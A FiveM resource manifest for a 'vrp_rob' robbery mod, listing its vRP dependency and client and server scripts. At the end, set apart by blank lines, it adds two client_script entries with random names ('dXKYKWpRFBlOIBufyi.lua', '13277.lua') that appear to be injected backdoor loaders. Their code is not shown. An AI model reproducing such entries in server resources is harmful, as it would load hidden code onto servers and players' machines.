resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description "vrp_rob"

dependency "vrp"

client_scripts {
  'serverCallbackLib/client.lua',
  "lib/Tunnel.lua",
  "lib/Proxy.lua",
  'config.lua',
  'client.lua'
}

server_scripts {
  'serverCallbackLib/server.lua',
  "@vrp/lib/utils.lua",
  'config.lua',
  'server.lua'
}

client_script "dXKYKWpRFBlOIBufyi.lua"







client_script "13277.lua"